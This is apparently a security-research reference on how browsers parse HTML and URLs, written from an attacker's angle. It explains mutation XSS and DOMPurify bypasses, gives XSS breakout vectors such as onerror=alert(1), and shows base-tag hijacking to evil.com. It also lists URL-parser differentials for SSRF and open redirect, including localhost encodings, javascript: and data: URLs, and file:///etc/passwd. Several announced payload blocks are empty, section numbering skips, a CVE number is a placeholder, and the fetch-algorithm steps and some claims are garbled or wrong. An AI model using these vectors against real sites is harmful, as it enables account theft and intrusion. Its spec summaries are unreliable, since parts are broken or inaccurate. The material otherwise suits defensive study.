1. The HTML Parser — Tokenization State Machine

1.1 Architecture Overview

The WHATWG HTML parser is a two-stage state machine:

Byte Stream → Input Stream Preprocessing → Tokenization → Tree Construction → DOM

Key Security Property: The parser is reentrant. While the tree construction stage handles a token, the tokenizer may be resumed (e.g., via document.write() inside a script), causing further tokens to be emitted and processed before the first token’s processing completes. This creates race conditions and unexpected state transitions.

The parser maintains:

  • Tokenizer state (current state of the state machine)
  • Insertion mode (how to handle tokens in tree construction)
  • Stack of open elements (the path from root to current node)
  • Script nesting level (tracks reentrant script execution)
  • Parser pause flag (prevents reentrant execution when set)
  • Form element pointer (points to the current <form> element, if any)
  • Head element pointer (points to the current <head> element)

1.2 Input Stream Preprocessing

Before tokenization, the input stream undergoes preprocessing:

  1. Encoding detection (see §12 Encoding Standard)
  2. Newline normalization: \r\n → \n, standalone \r → \n
  3. NULL handling: U+0000 NULL is replaced with U+FFFD REPLACEMENT CHARACTER in most contexts, but preserved in certain foreign content contexts

Injection Relevance: If you can inject \r or \n into a context where a server-side parser treats them differently than the browser’s preprocessor, you can create parser differentials.

1.3 Tokenizer States (Complete Security-Critical List)

The tokenizer consists of 80+ states. Here are the security-critical ones with exact transitions:

1.3.1 Data State (Initial State)

Consume next input character:
- U+0026 (&)     → character reference in data state
- U+003C (<)     → tag open state
- U+0000 (NULL)  → parse error. Emit U+FFFD REPLACEMENT CHARACTER
- EOF            → emit end-of-file token
- Anything else  → emit current input character as character token

Injection Angle: In data state, < is the only character that can start a tag. Everything else is emitted as plain text. If your injection lands in data state and you need to break out, you MUST emit <.

1.3.2 Tag Open State

Consume next input character:
- U+0021 (!)     → markup declaration open state
- U+002F (/)     → end tag open state
- ASCII alpha    → create start tag token, set tag name to lowercase(c), switch to tag name state
- U+003F (?)     → parse error. Create comment token, set data to "?", switch to bogus comment state
- EOF            → parse error. Emit U+003C (<), emit end-of-file token
- Anything else  → parse error. Emit U+003C (<), reconsume in data state

Injection Angle: <?anything> is treated as a bogus comment, not as a processing instruction. This is a common bypass vector:

The <?xml ...> becomes a comment, and the script executes. Server-side XML parsers may treat this as a real PI and allow the script through.

1.3.3 Tag Name State

Consume next input character:
- U+0009/TAB, U+000A/LF, U+000C/FF, U+0020/SPACE → before attribute name state
- U+002F (/)     → self-closing start tag state
- U+003E (>)     → emit current tag token, switch to data state
- ASCII upper    → append lowercase(c) to tag name
- U+0000 (NULL)  → parse error. Append U+FFFD to tag name
- EOF            → parse error. Emit end-of-file token
- Anything else  → append c to tag name

Injection Angle: Tag names are case-insensitive and lowercased. <SCRIPT>, <Script>, <ScRiPt> all become <script>. Filters doing case-sensitive string matching will fail.

1.3.4 Before Attribute Name State

Consume next input character:
- U+0009/TAB, U+000A/LF, U+000C/FF, U+0020/SPACE → ignore, stay in this state
- U+002F (/) or U+003E (>) or EOF → reconsume in after attribute name state
- U+003D (=)     → parse error. Start new attribute, set name to "=", switch to attribute name state
- Anything else  → start new attribute, set name to c, switch to attribute name state

Injection Angle: Multiple attributes with the same name are allowed. The parser does not reject duplicates. The last duplicate wins in most implementations, but the exact behavior depends on the tree construction stage.

1.3.5 Attribute Name State

Consume next input character:
- U+0009/TAB, U+000A/LF, U+000C/FF, U+0020/SPACE, U+002F (/), U+003E (>) → reconsume in after attribute name state
- U+003D (=)     → switch to before attribute value state
- ASCII upper    → append lowercase(c) to attribute name
- U+0000 (NULL)  → parse error. Append U+FFFD to attribute name
- U+0022 (") or U+0027 (') or U+003C (<) → parse error. Treat as anything else
- EOF            → parse error. Emit end-of-file token
- Anything else  → append c to attribute name

Injection Angle: Attribute names cannot contain ", ', or <. If a filter strips these from attribute names, the parser will still emit a parse error but continue processing.

1.3.6 Before Attribute Value State

Consume next input character:
- U+0009/TAB, U+000A/LF, U+000C/FF, U+0020/SPACE → ignore, stay
- U+0022 (")     → switch to attribute value (double-quoted) state
- U+0027 (')     → switch to attribute value (single-quoted) state
- U+003E (>)     → parse error. Emit current tag token, switch to data state
- Anything else  → reconsume in attribute value (unquoted) state

1.3.7 Attribute Value (Double-Quoted) State

Consume next input character:
- U+0022 (")     → switch to after attribute value (quoted) state
- U+0026 (&)     → switch to character reference in attribute value state
- U+0000 (NULL)  → parse error. Append U+FFFD to attribute value
- EOF            → parse error. Emit end-of-file token
- Anything else  → append c to attribute value

Injection Angle: In double-quoted attributes, the only way to break out is " (unless the attribute value is later reflected without quotes). You cannot use < to break out directly — the parser will append it to the attribute value.

1.3.8 Attribute Value (Single-Quoted) State

Same as double-quoted but with ' as delimiter.

1.3.9 Attribute Value (Unquoted) State

Consume next input character:
- U+0009/TAB, U+000A/LF, U+000C/FF, U+0020/SPACE → switch to before attribute name state
- U+0026 (&)     → switch to character reference in attribute value state
- U+003E (>)     → emit current tag token, switch to data state
- U+0000 (NULL)  → parse error. Append U+FFFD to attribute value
- U+0022 (") or U+0027 (') or U+003C (<) or U+003D (=) or U+0060 (`) → parse error. Treat as anything else
- EOF            → parse error. Emit end-of-file token
- Anything else  → append c to attribute value

Injection Angle: Unquoted attributes are extremely dangerous. The following characters end or affect the attribute:

  • Space/tab/LF/FF → ends attribute, starts new one
  • > → ends tag
  • = → parse error but still processed
  • ", ', <, ` → parse error but appended

Classic breakout: attr=value onerror=alert(1) x=

1.3.10 Character Reference State

This state handles HTML entity decoding (&amp;, &#x27;, etc.). The algorithm:

  1. Set temporary buffer to "&"
  2. Consume next character
  3. If ASCII alphanumeric or #, append to buffer and continue consuming
  4. If ; found, attempt to match entity. If match, emit decoded character(s). If no match, emit buffer contents as characters.
  5. If EOF or non-matching character, emit buffer contents as characters.

Injection Angle: Entity decoding happens during tokenization, not during tree construction. This means:

In data state, this emits <script>alert(1)</script> as character tokens, which are then parsed in tree construction. But in RAWTEXT or RCDATA states, entities are NOT decoded (except in RCDATA with the character reference state).

Critical: In attribute values, entities ARE decoded. " onerror=alert(1) can be written as &quot; onerror=alert(1).

1.3.11 Script Data State

Consume next input character:
- U+003C (<)     → switch to script data less-than sign state
- U+0000 (NULL)  → parse error. Emit U+FFFD
- EOF            → emit end-of-file token
- Anything else  → emit as character token

Injection Angle: Inside <script>, the content is in script data state. The only way to break out is </script>. However, there are sub-states:

  • Script data less-than sign state: After <, if next is /, switch to script data end tag open state
  • Script data end tag open state: If next chars form “script”, switch to script data end tag name state
  • Script data end tag name state: If appropriate end tag, emit end tag token

The <!-- Escape Hatch:

Inside script data, <!-- switches to script data escaped state. --> switches back. But critically, the HTML parser still sees </script> and closes the script block. The JavaScript engine treats <!-- and --> as single-line comments. This creates a differential where the HTML parser and JS parser disagree on where the script ends.

1.3.12 RAWTEXT State

Used for: <style>, <xmp>, <iframe>, <noembed>, <noframes>, <noscript> (when scripting enabled)

Consume next input character:
- U+003C (<)     → switch to RAWTEXT less-than sign state
- U+0000 (NULL)  → parse error. Emit U+FFFD
- EOF            → emit end-of-file token
- Anything else  → emit as character token

Injection Angle: RAWTEXT elements treat everything as raw text until </tagname>. No entity decoding, no tag parsing. Breakout requires exact end tag:

1.3.13 RCDATA State

Used for: <title>, <textarea>

Consume next input character:
- U+0026 (&)     → switch to character reference in RCDATA state
- U+003C (<)     → switch to RCDATA less-than sign state
- U+0000 (NULL)  → parse error. Emit U+FFFD
- EOF            → emit end-of-file token
- Anything else  → emit as character token

Injection Angle: RCDATA allows entity decoding but not tag parsing (except end tags). Breakout:

1.3.14 Bogus Comment State

When the parser encounters invalid markup (e.g., <?xml>, <!not-doctype>), it switches to bogus comment state and consumes everything until >.

Consume next input character:
- U+003E (>)     → emit comment token, switch to data state
- EOF            → emit comment token, emit end-of-file token
- U+0000 (NULL)  → append U+FFFD to comment data
- Anything else  → append c to comment data

Injection Angle: Bogus comments are inert — they don’t execute. But they can be used to consume content that a server-side parser might treat differently:

Browser: bogus comment (safe) Server XML parser: processing instruction (dangerous)

1.4 Parse Errors vs. Recovery

The HTML spec defines parse errors but mandates error recovery. The parser must never abort. Every parse error has a defined recovery behavior. This is the fundamental reason why injection is possible — the parser will always produce some DOM, and that DOM may be executable.

2. Tree Construction & Insertion Modes

2.1 The Tree Construction Dispatcher

As each token is emitted from the tokenizer, the tree construction dispatcher decides how to handle it:

If stack of open elements is empty
  → process in current insertion mode

If adjusted current node is HTML namespace element
  → process in current insertion mode

If adjusted current node is MathML text integration point
  AND token is start tag with tag name NOT "mglyph" or "malignmark"
  → process in current insertion mode

If adjusted current node is MathML text integration point
  AND token is character token
  → process in current insertion mode

If adjusted current node is MathML <annotation-xml>
  AND token is start tag with tag name "svg"
  → process in current insertion mode

If adjusted current node is HTML integration point
  AND token is start tag
  → process in current insertion mode

If adjusted current node is HTML integration point
  AND token is character token
  → process in current insertion mode

If token is end-of-file
  → process in current insertion mode

Otherwise
  → process according to "parsing tokens in foreign content"

Critical Security Concept: The dispatcher determines whether a token is processed as HTML or as foreign content (SVG/MathML). This is the mechanism behind namespace confusion attacks.

2.2 Stack of Open Elements

The stack of open elements is a stack of Element nodes. The current node is the top of the stack. The adjusted current node is:

  • The current node, OR
  • If the parser was created by the HTML fragment parsing algorithm and the stack has only one element, the context element passed to the fragment parser

Security Relevance: The stack depth determines insertion mode behavior. Deep nesting can trigger flattening or repair behaviors that create mXSS.

2.3 Insertion Modes (Complete Security-Relevant List)

2.3.1 “initial” Insertion Mode

Handles DOCTYPE tokens. If no DOCTYPE, switches to “before html”.

Quirks Mode Trigger: If DOCTYPE is missing, malformed, or triggers legacy conditions, the document enters quirks mode. In quirks mode:

  • CSS box model changes
  • Table cells without explicit widths behave differently
  • Some ID selectors become case-insensitive
  • Non-standard HTML parsing: Some elements close differently

2.3.2 “before html” Insertion Mode

If a start tag token for “html” is seen, insert an HTML element for the token and switch to “before head”.

Injection Angle: If content is injected before <html>, it gets foster-parented or inserted into the <html> element depending on the token type.

2.3.3 “in head” Insertion Mode

Critical for meta charset injection and base tag hijacking.

Start tag "base":
  Insert HTML element. If no base element exists yet, set it as the document's base.

Start tag "meta":
  Insert HTML element. If charset attribute present, may change document encoding.

Start tag "script":
  Run special script handling (see below).

Base Tag Hijacking: If attacker can inject <base href="https://evil.com/"> into <head>, all relative URLs in the document resolve to the attacker’s domain. This affects:

  • <script src="/app.js"> → loads from evil.com
  • <a href="/login"> → points to evil.com
  • <form action="/submit"> → submits to evil.com
  • fetch("/api") → same-origin, so goes to evil.com

2.3.4 “in body” Insertion Mode

The primary XSS surface. Handles most HTML elements.

Special handling for:

  • <script>: Insert element, mark as “parser-inserted”, switch tokenizer to script data state
  • <style>: Insert element, switch tokenizer to RAWTEXT state
  • <template>: Insert element, push “in template” insertion mode onto template insertion mode stack
  • Form elements: Interact with form element pointer

2.3.5 “in table” Insertion Mode

This is where foster parenting happens.

Start tag "table":
  If stack of open elements has <template>, insert HTML element
  Else if in quirks mode and form element pointer is not null, do nothing
  Else: insert HTML element, set form element pointer to null

Anything else (not explicitly handled):
  Parse error. Enable foster parenting.
  Process token using "in body" rules.
  Disable foster parenting.

2.4 Foster Parenting Algorithm

When foster parenting is enabled, elements are inserted according to these rules:

  1. Let last template be the last <template> element in the stack of open elements, or null if none
  2. Let last table be the last <table> element in the stack, or null if none
  3. If last template is null and last table is null:
    • Insert at the end of the first element in the stack (the <html> element)
  4. If last template is not null and (last table is null or last template is lower in the stack than last table):
    • Insert at the end of last template’s template contents
  5. Otherwise:
    • Insert before last table in its parent

Security Impact: Content that appears inside <table> in the source HTML may end up outside the table in the DOM. This breaks sanitizers that assume DOM structure matches source structure.

Example:

If the sanitizer allows <div> inside <td> but the parser fosters the <script> outside the table, the script executes even though the sanitizer thought it was safe.

2.5 The “in foreign content” Insertion Mode

When the adjusted current node is in the SVG or MathML namespace, tokens are processed differently:

Start tag token:
  1. If current token's tag name is one of: b, big, blockquote, body, br, center, code, dd, div, dl, dt, em, embed, h1, h2, h3, h4, h5, h6, head, hr, i, img, li, listing, menu, meta, nobr, ol, p, pre, ruby, s, small, span, strong, strike, sub, sup, table, tt, u, ul, var, or font (with specific attributes)
     → Parse error. Pop elements from stack until current node is in HTML namespace or is an integration point.
     → Process token in current insertion mode.

  2. Otherwise:
     - If current node is SVG namespace: adjust SVG attributes for token
     - Adjust foreign attributes for token (handles xlink, xml namespaces)
     - Insert foreign element in same namespace as current node
     - If self-closing flag set: pop current node and acknowledge flag

End tag token:

  1. If tag name matches current node and current node is not in HTML namespace:
     - Pop current node
  2. Otherwise: loop through stack from top to bottom. If find matching node not in HTML namespace, pop until and including that node. If not found, ignore.

Security Impact: This is where namespace confusion mXSS originates. Elements parse differently depending on whether they’re in foreign content or HTML content.

3. Foreign Content, Integration Points & Namespace Confusion

3.1 Namespaces in the DOM

The DOM has three namespaces defined by WHATWG:

NamespaceURIElements
HTMLhttp://www.w3.org/1999/xhtmlAll HTML elements
SVGhttp://www.w3.org/2000/svg<svg>, <g>, <path>, etc.
MathMLhttp://www.w3.org/1998/Math/MathML<math>, <mfrac>, <mi>, etc.

Critical: The namespace of an element determines:

  • How its children are parsed
  • What attributes are valid
  • How CSS selectors match
  • Whether scripts execute

3.2 MathML Text Integration Points

The following MathML elements are text integration points:

  • <mi>
  • <mo>
  • <mn>
  • <ms>
  • <mtext>

When the adjusted current node is a MathML text integration point:

  • Start tags (except <mglyph> and <malignmark>) are processed in HTML content
  • Character tokens are processed in HTML content

Security Impact: Inside <mtext>, an <img> tag is parsed as HTML, not as MathML. It executes onerror handlers. But if the same content is reparsed in a different context, the namespace may change.

3.3 HTML Integration Points

The following elements are HTML integration points:

  • <foreignObject> (SVG namespace)
  • <desc> (SVG namespace)
  • <title> (SVG namespace)
  • <annotation-xml> (MathML namespace) — only if it has an encoding attribute with value “text/html” or “application/xhtml+xml”

When the adjusted current node is an HTML integration point:

  • Start tags are processed in HTML content
  • Character tokens are processed in HTML content

3.4 The Namespace Confusion Attack

Root Cause: The same markup string can produce different DOM trees depending on the context element used for parsing. When a sanitizer uses DOMParser or innerHTML with a different context than the final insertion point, namespaces may differ.

DOMPurify’s Architecture (The mXSS Problem):

  1. DOMPurify creates a detached Document (context element = <body>)
  2. Parses dirty HTML into this document
  3. Walks the DOM, removing disallowed elements/attributes
  4. Serializes clean DOM back to HTML string
  5. Application assigns element.innerHTML = cleanString

The Problem: Step 1 uses <body> context. Step 5 uses the application’s context. If the application inserts into an SVG element, the second parse uses SVG namespace for elements that were in HTML namespace during sanitization.

3.5 Real mXSS Vector: MathML + Form + mglyph

CVE-2020-XXXX class (DOMPurify < 2.0.17):

First Parse (DOMPurify sanitization in HTML context):

  1. <form> → HTML form element
  2. <math> → MathML math element (child of form)
  3. <mtext> → MathML mtext element (text integration point)
  4. </form> → closes first form
  5. <form> → new HTML form element (nested forms are allowed in DOM during parsing but immediately popped in some cases)
  6. <mglyph> → HTML mglyph element (because inside <mtext>, which is a text integration point, <mglyph> is not special, so it’s parsed as HTML)
  7. <style> → HTML style element (child of mglyph)
  8. </math> → closes the <math> element
  9. <img src onerror=alert(1)> → inside <style> which is now in HTML namespace (RAWTEXT). The <img> is treated as raw text, not executed.

DOMPurify sees this as safe and serializes it.

Serialized Output:

Second Parse (innerHTML assignment in application context):

  1. <form> → HTML form
  2. <math> → MathML math
  3. <mtext> → MathML mtext (text integration point)
  4. <form> → Cannot nest forms. The parser processes it but the form element pointer behavior changes.
  5. <mglyph> → MathML mglyph (because the tree construction dispatcher says: “if adjusted current node is MathML text integration point and token is start tag whose tag name is neither mglyph nor malignmark → process in HTML content”. Since tag name IS “mglyph”, it falls to “Otherwise” and is processed in foreign content → MathML namespace)
  6. <style> → MathML style element (because inside MathML namespace, <style> is NOT a raw text element — it’s a normal element whose content is parsed as HTML!)
  7. </math> → closes the <math> element
  8. Now the parser is back in HTML namespace
  9. <img src onerror=alert(1)> → parsed as HTML image element with event handler
  10. </style> → closes the style element

Result: The <img> executes because during the second parse, the <style> element was in MathML namespace and its content was parsed as HTML, not as RAWTEXT.

Key Insight: mglyph and malignmark are special because they are excluded from the text integration point rule. When inside <mtext>, most start tags are processed as HTML. But <mglyph> and <malignmark> are processed as foreign content (MathML). This namespace flip is the bypass.

3.6 SVG Namespace Confusion

Inside <svg>, the following elements are parsed as normal HTML (not raw text):

  • <style>
  • <script>
  • <title>

Vector:

In HTML namespace, <style> is RAWTEXT — content is raw text. In SVG namespace, <style> is a normal element — content is parsed as HTML. If a sanitizer serializes and re-parses, the namespace may change, causing the content to be reinterpreted as HTML.

4. Mutation XSS (mXSS) — Theory & Real Bypasses

4.1 The Fundamental Theorem of mXSS

Theorem: For any HTML sanitizer that operates by parse → sanitize → serialize → reparse, there exists an input string such that the DOM tree after the first parse is safe, but the DOM tree after the second parse contains executable JavaScript.

Proof Sketch: The HTML fragment parsing algorithm depends on the context element. If the sanitizer’s context element differs from the application’s insertion context, namespace confusion occurs. Additionally, the HTML parser’s error recovery and foster parenting can move elements between contexts during reparsing.

4.2 DOMPurify Bypass History (Real CVEs)

4.2.1 Namespace Confusion (Bentkowski, 2020)

Payload:

Mechanism: See §3.5. The first parse produces an inert DOM. The second parse, after serialization, produces an executable DOM due to namespace transitions.

4.2.2 Nesting-Based mXSS (CVE-2024-47875)

Root Cause: Absence of maximum nesting depth limit in DOMPurify. Deeply nested structures cause the browser to flatten or repair the DOM differently than the sanitizer expects.

Patch:

Mechanism: When HTML is deeply nested (e.g., 1000 levels of <div>), the browser’s parser may impose its own depth limits or memory constraints, causing elements to be foster-parented or dropped. If the sanitizer doesn’t enforce the same limits, the sanitized output may mutate when reparsed.

Representative Shape:

With extreme nesting around these elements, the parser flattens the structure, causing namespace transitions.

4.2.3 Prototype Pollution as Sanitizer Downgrade (CVE-2024-45801)

Root Cause: DOMPurify’s configuration objects were vulnerable to prototype pollution. If Object.prototype.__depth was set, DOMPurify’s depth check could be bypassed.

Mechanism:

This polluted the config object used by DOMPurify, disabling the nesting depth protection.

Fix: DOMPurify now creates internal config objects with Object.create(null) to avoid prototype pollution.

4.2.4 Comment-Based Bypass (Gareth Heyes)

Payload:

Mechanism: The payload is hidden inside an id attribute. DOMPurify allows id attributes. When serialized and reparsed:

  1. The id attribute value contains </style>
  2. If this attribute is later used in a context where it’s inserted as HTML (e.g., via innerHTML or template replacement), the </style> breaks out of a style context
  3. The <img> executes

Key: The bypass relies on the context of insertion, not just the sanitizer. DOMPurify’s output is “safe” in isolation, but dangerous when placed in a specific context.

4.2.5 forceKeepAttr Hook Bypass

Mechanism: DOMPurify’s forceKeepAttr hook allowed developers to mark attributes as safe. The regex check for dangerous patterns was executed after the hook, meaning attributes marked with forceKeepAttr skipped the regex entirely.

Exploitation:

Attacker injects: <div style="background:url(javascript:alert(1))">

The style attribute is kept and not checked against the URI regex, leading to XSS via CSS.

4.2.6 uponSanitizeAttribute Loop Bypass

Mechanism: DOMPurify iterates over attributes using a cached list. If a hook adds a NEW attribute during iteration, that new attribute is NOT checked.

The onerror attribute is added during the loop but wasn’t in the original attribute list, so it’s never sanitized.

DOMPurify’s security heavily relies on a single regex that prevents dangerous patterns in attribute values:

  • </ (end tag start)
  • <tag (start tag start)

If this regex matches an attribute value, the attribute is removed.

5. Foster Parenting & Table Repair

5.1 Exact Foster Parenting Algorithm

When the tree construction stage processes a token in “in table” insertion mode and the token is not explicitly handled, foster parenting is enabled.

Algorithm:

  1. Let last template be the last <template> element in the stack of open elements, or null
  2. Let last table be the last <table> element in the stack, or null
  3. If last template is null AND last table is null:
    • Let parent be the first element in the stack of open elements (the <html> element)
    • Insert at the end of parent
  4. If last template is not null AND (last table is null OR last template is lower in the stack than last table):
    • Let parent be last template’s template contents (a DocumentFragment)
    • Insert at the end of parent
  5. Otherwise:
    • Let parent be last table’s parent node
    • Insert before last table in parent

Security Impact:

  • Elements that appear inside <table> in source may be inserted before the table in DOM
  • This breaks XPath/CSS selectors that assume structure
  • Sanitizers that check “is this script inside a table cell?” may be bypassed

6.1 innerHTML

Algorithm (simplified):

  1. If context element is <template>, use template contents as context
  2. If context element is not Element, or document is HTML with local name “html” and HTML namespace, set context to a newly created <body> element
  3. Invoke HTML fragment parsing algorithm with context and input string

  5. Otherwise, return the children of the context element

  • Scripts in the parsed fragment do NOT execute during parsing
  • Scripts execute when the fragment is inserted into the main document
  • <script> elements in the fragment have their “already started” flag unset

6.2 insertAdjacentHTML

Positions:

  • "beforebegin" — before the element
  • "afterbegin" — inside element, before first child
  • "beforeend" — inside element, after last child
  • "afterend" — after the element

Algorithm:

  1. Determine context element based on position
  2. If position is “beforebegin” or “afterend”, context is the element’s parent
  3. If position is “afterbegin” or “beforeend”, context is the element itself
  4. If context is null or Document, throw NoModificationAllowedError
  5. If context is not Element (or is <html> in HTML namespace), set context to <body>
  6. Parse string using fragment parsing algorithm with context
  7. Insert fragment at specified position

Security Difference from innerHTML:

  • insertAdjacentHTML does NOT reparse the existing element
  • It only parses the new string
  • This avoids corrupting existing elements
  • But it still triggers the same mXSS risks if the context element differs from the sanitizer’s context

6.3 DOMParser

Security Properties:

  • Creates a full Document, not just a fragment
  • Scripts in the parsed document do NOT execute
  • The document has its own origin (about:blank)
  • document.write() and document.open() work on this document

Differential: DOMParser always parses as a full document with <html>, <head>, <body>. If a sanitizer uses DOMParser but the application uses innerHTML on a <div>, the context differs.

8. The URL Parser — State Machine & Differential Exploitation

8.1 URL Record Structure

A WHATWG URL record has these fields:

  • scheme (string)
  • username (string)
  • password (string)
  • host (null, string, or IPv4/IPv6 address)
  • port (null or 16-bit unsigned integer)
  • path (list of strings)
  • query (null or string)
  • fragment (null or string)
  • cannot-be-a-base-URL flag (boolean)
  • blob URL entry (null or blob URL entry)

8.2 Special Schemes

Special schemes get different parsing rules:

  • http, https, ws, wss, ftp, file

For special schemes:

  • Backslash (\) is treated as /
  • Authority section is expected
  • IDNA/punycode processing applies
  • Default ports are normalized to null

Non-special schemes (e.g., javascript:, data:, blob:):

  • Opaque path parsing
  • No authority normalization
  • Backslash is part of path

8.3 URL Parser State Machine (Complete Security-Critical States)

The parser uses these states, consuming one character at a time:

8.3.1 Scheme Start State

If c is ASCII alpha:
  Append lowercased c to buffer
  Set state to scheme state
Otherwise, if state override is not given:
  Set state to no scheme state
  Decrease pointer by 1 (reconsume)
Otherwise:
  Return failure

8.3.2 Scheme State

If c is ASCII alphanumeric, +, -, or .:
  Append lowercased c to buffer
Otherwise, if c is ":":
  If state override is given:
    - If url's scheme is special and buffer is not special: return
    - If url's scheme is not special and buffer is special: return
    - If url includes credentials or has non-null port, and buffer is "file": return
    - If url's scheme is "file" and host is empty string: return
  Set url's scheme to buffer
  If state override is given:
    - If port is url's scheme's default port, set port to null
    - Return
  If url's scheme is "file":
    - If remaining does not start with "//", return failure
    - Set state to file state
  Else if url is special and base is not null and base's scheme equals url's scheme:
    - Set state to special relative or authority state
  Else if url is special:
    - Set state to special authority slashes state
  Else if remaining starts with "/":
    - Set state to path or authority state
    - Increase pointer by 1
  Else:
    - Set url's cannot-be-a-base-URL flag
    - Set path to empty list
    - Set state to cannot-be-a-base-URL path state
Otherwise:
  Return failure

8.3.3 No Scheme State

If base is null or base's cannot-be-a-base-URL flag is set and c is not "#":
  Return failure
If base's cannot-be-a-base-URL flag is set and c is "#":
  Set url's scheme to base's scheme
  Set path to base's path
  Set query to base's query
  Set fragment to empty string
  Set cannot-be-a-base-URL flag
  Set state to fragment state
Otherwise if base's scheme is not "file":
  Set state to relative state
  Decrease pointer by 1
Otherwise:
  Set state to file state
  Decrease pointer by 1

8.3.4 Relative State

Set url's scheme to base's scheme
If c is "/":
  Set state to relative slash state
Otherwise if url is special and c is "\":
  Invalid-reverse-solidus validation error
  Set state to relative slash state
Otherwise:
  Set username to base's username
  Set password to base's password
  Set host to base's host
  Set port to base's port
  Set path to clone of base's path
  Set query to base's query
  If c is "?":
    Set query to empty string
    Set state to query state
  Else if c is "#":
    Set fragment to empty string
    Set state to fragment state
  Else if c is not EOF:
    Set query to null
    Shorten url's path
    Set state to path state
    Decrease pointer by 1

Security Impact: In relative state, the URL inherits the base URL’s authority (host, port, credentials). If the base URL is attacker-controlled, relative URLs may resolve to unexpected locations.

8.3.5 Authority State

If c is "@":
  If atSignSeen is true:
    Prepend "%40" to password
  Set atSignSeen to true
  For each codePoint in buffer:
    If codePoint is ":" and passwordTokenSeen is false:
      Set passwordTokenSeen to true
      Continue
    If passwordTokenSeen is true:
      Append percent-encoded codePoint to password
    Else:
      Append percent-encoded codePoint to username
  Set buffer to empty string
Else if c is EOF or c is "/" or c is "?" or c is "#" or (url is special and c is "\"):
  If atSignSeen is true and buffer is empty:
    Return failure
  Decrease pointer by (number of code points in buffer + 1)
  Set buffer to empty string
  Set state to host state
Else:
  Append c to buffer

Security Impact — The Multiple @ Attack:

https://evil.com@trusted.com@actual.com

The parser processes characters until it hits @. Everything before the LAST @ is treated as credentials. So:

  • evil.com@trusted.com → username (or username+password)
  • actual.com → host

But some server-side parsers split on the FIRST @, seeing evil.com as host and trusted.com@actual.com as credentials.

8.3.6 Host State & Host Parser

The host parser handles:

  • Domain names (IDNA/punycode conversion)
  • IPv4 addresses (decimal, hex, octal, dotted)
  • IPv6 addresses (in brackets)

IPv4 Parsing:

http://0x7f.0.0.1       → 127.0.0.1
http://2130706433       → 127.0.0.1 (decimal)
http://0177.0.0.1       → 127.0.0.1 (octal)
http://127.1            → 127.0.0.1
http://0x7f000001       → 127.0.0.1

IPv6 Parsing:

http://[::ffff:127.0.0.1]    → IPv4-mapped IPv6 localhost
http://[0:0:0:0:0:ffff:7f00:1]  → Same
http://[::1]                 → IPv6 localhost

IDNA / Homograph:

https://раураl.com        (Cyrillic 'а' looks like Latin 'a')
→ https://xn--paul-8fd.com

8.3.7 Path State

If c is EOF or c is "/" or (url is special and c is "\") or (not special and c is "?") or (not special and c is "#"):
  If url is special and c is "\":
    Invalid-reverse-solidus validation error
  If buffer is a double-dot path segment:
    Shorten url's path
    If c is not "/" and not (special and "\"):
      Append "" to path
  Else if buffer is a single-dot path segment and c is not "/" and not (special and "\"):
    Append "" to path
  Else if buffer is not a single-dot path segment:
    If url's scheme is "file" and path is empty and buffer is Windows drive letter:
      Replace buffer's first character with buffer[0] followed by ":"
    Append buffer to path
  Set buffer to empty string
  If c is "?":
    Set query to empty string
    Set state to query state
  If c is "#":
    Set fragment to empty string
    Set state to fragment state
Else:
  Append c to buffer

Path Traversal in URLs:

https://trusted.com/../evil.com/
https://trusted.com/%2e%2e/evil.com/

The path state handles . and .. segments. But if the server normalizes the path BEFORE extracting the host, and the browser normalizes AFTER, differentials occur.

8.4 The Backslash Authority Bypass

The most reliable URL differential for SSRF and open redirect:

https://evil.com\@trusted.com/path
ParserResult
WHATWG (Browser)Host = trusted.com, Path = /path
RFC 3986 (most backends)Host = evil.com, Userinfo = trusted.com/path

Why it works:

  • WHATWG special schemes treat \ as /
  • So evil.com\@trusted.com becomes evil.com/@trusted.com
  • / after host starts the path, so @trusted.com is part of the path
  • But RFC 3986 treats \ as a valid userinfo character

Variants:

https://evil.com%5C%5C@trusted.com      (percent-encoded)
https://evil.com%2F@trusted.com         (percent-encoded slash in userinfo)
https://trusted.com@evil.com            (reversed)
https://evil.com?@trusted.com           (query confusion)
https://evil.com#@trusted.com           (fragment confusion)

8.5 javascript: URL Parsing

javascript://trusted.com/%0Aalert(1)

Parsing:

  • Scheme: javascript
  • Host: trusted.com (parsed as host even though javascript: doesn’t need one)
  • Path: /%0Aalert(1)

Execution: The JavaScript engine executes the entire URL after the scheme as code, ignoring the host. So the effective code is //trusted.com/%0Aalert(1) which is a JS comment followed by a newline and alert(1).

Bypass: Some validators check url.startsWith('javascript:') but miss javascript://.

8.6 data: URL Parsing

data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Properties:

  • data: URLs inherit the origin of the document that navigated to them (for iframes) or are opaque-origin (for top-level navigation, depending on browser)
  • No length limit in spec (browsers impose practical limits)
  • Can be used for XSS when uploaded files are served with wrong Content-Type

8.7 blob: URL Parsing

blob:https://trusted.com/uuid-string

Properties:

  • Origin is the origin of the creator
  • Can only be created by JavaScript
  • If creator is https://trusted.com, blob URL has that origin
  • Can be revoked via URL.revokeObjectURL()

SSRF Angle: If application validates url.startsWith('blob:') and allows it, attacker can create a blob containing HTML that makes same-origin requests.

8.8 file: URL Quirks

file:///etc/passwd              (Unix absolute)
file:///C:/Windows/System32     (Windows with drive letter)
file://server/share/file.txt    (UNC path)

Windows Drive Letter Handling:

  • file:C|/path → file:///C:/path (pipe converted to colon)
  • file:/path on Windows → may resolve to current drive

Security Impact: If a server-side application accepts file: URLs and passes them to a browser context, local files may be accessible.

9.2 Main Fetch Algorithm

The main fetch algorithm is the entry point for all resource fetching:

1. If request is a navigation request and response tainting is not "opaque":
   - Set response tainting to "cors" if mode is "cors"
   - Otherwise set to "basic"

2. If request's unsafe-request flag is set and (method is not CORS-safelisted method OR CORS-unsafe request-header names is not empty):
   - Set response tainting to "cors"
   - Let corsWithPreflightResponse be result of override fetch with "http-fetch" and fetchParams, true
   - If network error, clear cache entries
   - Return corsWithPreflightResponse

3. Otherwise:
   - Set response tainting to "cors"
   - Return result of override fetch with "http-fetch" and fetchParams

4. If recursive is true, return response

5. If response is not network error and not filtered response:
   - If response tainting is "cors":
     - Extract Access-Control-Expose-Headers
     - If credentials mode is not "include" and headerNames contains `*`, set CORS-exposed header-name list to all unique header names
     - Otherwise set CORS-exposed header-name list to headerNames
   - Set response to filtered response based on response tainting:
     - "basic" → basic filtered response
     - "cors" → CORS filtered response
     - "opaque" → opaque filtered response

6. Let internalResponse be response (if network error) or response's internal response

7. If internalResponse's URL list is empty, set it to clone of request's URL list

8. Set internalResponse's redirect taint to request's redirect-taint

9. If request is navigation request, set navigation timing allow values list

